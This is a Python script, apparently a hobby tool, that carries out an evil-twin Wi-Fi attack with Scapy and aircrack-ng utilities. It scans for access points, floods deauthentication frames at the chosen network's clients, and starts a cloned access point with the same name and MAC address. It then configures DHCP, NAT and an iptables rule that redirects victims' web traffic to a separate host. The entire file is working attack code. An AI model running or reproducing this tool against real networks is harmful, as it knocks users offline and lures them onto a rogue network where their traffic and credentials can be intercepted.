#!/usr/bin/python

#Suppress Scapy IPv6 warning
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

import multiprocessing
import threading, os, sys, argparse, signal
import subprocess

# Console colors
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
C  = '\033[36m' # cyan

AP_MAC = "ff:ff:ff:ff:ff:ff"
accessPoints = set() #Used to check whether scanned AP already exist in set (removes duplicates)
accessPointsMAC = [] #Stores APs MACs
accessPointsNames = [] #Stores APs ESSIDs (Names)
broadcast = "ff:ff:ff:ff:ff:ff"
clientList = [] #Used to create list od clients connected to target AP
deauthPkts = [ RadioTap() /\
                Dot11(addr1=broadcast, addr2="aa:aa:aa:11:22:33", addr3="aa:aa:aa:11:22:33") /\
                Dot11Deauth(reason=1)
             ] #Pkts to send when Deauth() starts
iface = "wlan0"


#Parses used arguments
def ParseArgs():
    # Create the arguments
    parser = argparse.ArgumentParser()

    parser.add_argument(
        "-i",
        "--interface",
        help = ("Choose an interface that supports monitor mode. Dflt: wlan0\n" +
                "Example: -i wlan1")
    )
    return parser.parse_args()

#Switches Wireless iface to Monitor mode with airmon-ng
def SwitchToMonitorMode(iface):
    os.system("clear")

    print "[*] Switching " +iface+ " to Monitor Mode, please wait"
    os.system("airmon-ng start " +iface+ " > /dev/null 2>&1")
    print G+ "[*] Done." +W

    return iface + "mon"

#Starts ChannelHopper in a new process and starts sniffing the traffic
def StartAPScanner(iface):
    print "[*] Starting the AP scanner"
    time.sleep(2)
    os.system("clear")
    print O+ "[*] " +C+ "Press Ctrl+c when scanner finds APs around you\n" +W

    p = multiprocessing.Process(target = ChannelHopper)
    p.start()
    sniff(iface=iface, prn=PacketHandler)
    
    if KeyboardInterrupt:
        p.terminate()
    #If all else fails:
    #kill -9 `ps -ef | grep main_script.py | grep -v grep | awk '{print $2}'`

#Hops through 13 channels, changes channel every 100ms
def ChannelHopper():
    while True:
        for channel in range(1,14):
            os.system("iw dev wlan0mon set channel %d" % channel)
            time.sleep(0.1)

#Handles every captured packet while sniffing in StartAPScanner
def PacketHandler(pkt):
    if pkt.haslayer(Dot11Beacon):
       if pkt.info and (pkt.info not in accessPoints):
           print "     " +O+ str(len(accessPoints)+1) +W, pkt.addr3, O+ pkt.info +W
           accessPoints.add(pkt.info)
           accessPointsNames.append(pkt.info)
           accessPointsMAC.append(pkt.addr2)

#Handles scanning of clients connected to targeted AP
#For every discovered client crafts pkt and starts deauth in separate thread
def ClientScanPacketHandler(pkt):
    clientCount = 0

    if pkt.haslayer(Dot11):
        #if packet addresses exist and Destination is not broadcast
        if pkt.addr1 and pkt.addr2 and pkt.addr1 != broadcast:
            if AP_MAC == pkt.addr1:
                #If it is Assocciation Req or Resp OR Reassocciation Req or Resp
                if pkt.type in [0, 1, 2, 3, 4, 5]:
                    if (pkt.addr2 not in clientList) and pkt.addr2 != "":
                        clientList.append(pkt.addr2)
                        print O+ "[*] Deauthing client: " +W+ pkt.addr2
                        
                        #Ensures spawning not more than 10 daemon processes
                        clientCount += 1
                        if clientCount <= 10:
                            #Deauth pkt from client to AP
                            deauthPkts.append(RadioTap() /\
                                    Dot11(addr1=pkt.addr1, addr2=pkt.addr2, addr3=pkt.addr2) /\
                                    Dot11Deauth(reason=1))
                            #Deauth pkt from AP to client (better efficiency when deauthing)
                            deauthPkts.append(RadioTap() /\
                                    Dot11(addr1=pkt.addr2, addr2=pkt.addr1, addr3=pkt.addr1) /\
                                    Dot11Deauth(reason=1))
                            
                            deauth = threading.Thread(target = DeauthEngine, args=(deauthPkts,))
                            deauth.daemon = True
                            deauth.start()

                        if KeyboardInterrupt:
                            deauth.join()

#Starts Twin AP with same MAC and Name as target AP
def StartFakeAP(num_choice):
    print G+ "[*] Twin AP running successfully" +W
    os.system("airbase-ng -e " +accessPointsNames[num_choice-1]+ \
                            " -c " +str(random.randrange(1,14))+ \
                            " -a " +accessPointsMAC[num_choice-1]+ \
                            " " +iface+ \
                            " > /dev/null 2>&1")
    
    # > /dev/null 2>&1
    """subprocess.Popen(["airbase-ng", "-e", accessPointsNames[num_choice-1], \
                         "-c", str(random.randrange(1,14)), \
                         "-a", accessPointsMAC[num_choice-1], \
                         iface])"""

#Starts client scan of target AP and launches deauth
def StartDeauth(iface):
    print G+ "[*] Deauth started running, please wait 30 sec for it to scan the clients" +W
    sniff(iface=iface, prn=ClientScanPacketHandler)

#Main deauth pkt sending code
def DeauthEngine(deauthPkts):
    global iface
    time.sleep(30)

    if len(deauthPkts) == 0:
        pass
    else:
        while True:
            try:    
                for pkt in deauthPkts:
                    sendp(pkt, iface=iface, verbose=0)
            except KeyboardInterrupt:
                break
#Configures Twin's netmask, dhcp config and starts dhcp server
def ConfigureTwinAP():
    print O+ "[*] Configuring Twin AP" +W
    time.sleep(5)
    os.system("ifconfig at0 up")
    os.system("ifconfig at0 192.168.1.129 netmask 255.255.255.128")
    os.system("route add -net 192.168.1.128 netmask 255.255.255.128 gw 192.168.1.129")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    os.system("iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE")
    os.system("iptables --append FORWARD --in-interface at0 -j ACCEPT")
    os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.106:80")
    os.system("iptables -t nat -A POSTROUTING -j MASQUERADE")
    print G+ "[*] Done."

    print O+ "[*] Configuring dhcp" +W
    os.system("dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhclient-eth0.pid at0 > /dev/null 2>&1")
    print G+ "[*] Done." +W
    os.system("/etc/init.d/isc-dhcp-server start")

#Main function
def EngineStart():
    args = ParseArgs()
    global iface
    global AP_MAC
    iface = args.interface
    choice = 0
    num_choice = 0
    deauth = multiprocessing.Process(target = StartDeauth, args=(iface,))
    twin = multiprocessing.Process(target = StartFakeAP, args=(num_choice,)) #Because calls an error if this is not here

    #If no argument was given to parser
    if iface == None: 
        iface="wlan0"

    iface = SwitchToMonitorMode(iface)
    StartAPScanner(iface)

    num_choice = int(raw_input("\n" +O+ "[*] " +C+ "Choose number of an access point as target: "+W))
    print "\nYou selected the " +O+ accessPointsNames[num_choice-1] +W+ " as target\n"
    AP_MAC = accessPointsMAC[num_choice-1]

    choice = raw_input("Skip deauthentication phase? (y/n): ")

    if choice == "y":
        twin = multiprocessing.Process(target = StartFakeAP, args=(num_choice,))
        twin.daemon = True
        twin.start()
    elif choice == "n":
        deauth.daemon = True
        deauth.start()

        twin = multiprocessing.Process(target = StartFakeAP, args=(num_choice,))
        twin.daemon = True
        twin.start()
    else:
        print "Wrong answer, exiting..."
        sys.exit(1)
    
    ConfigureTwinAP()
    #StartApacheAndMysql()

    if deauth.is_alive():
        print "deauth test sleep 60 sec"
        time.sleep(60) #Just to see if process activates
        deauth.terminate()
        print "[*] Deauth turned off"

    print "Test sleeping for 60 sec"
    time.sleep(60)
    EngineStop(twin)
    
#Stops all processes and exits
def EngineStop(twin):
    os.system("kill -9 " +str(twin.pid + 1)) #Didn't find any other way
    os.system("rm /var/run/dhclient-eth0.pid")
    os.system("/etc/init.d/isc-dhcp-server stop")

    print G+ "[*] Engine stopped successfully, farewell :)" +W

#Engine stops automatically when script comes to an end
EngineStart()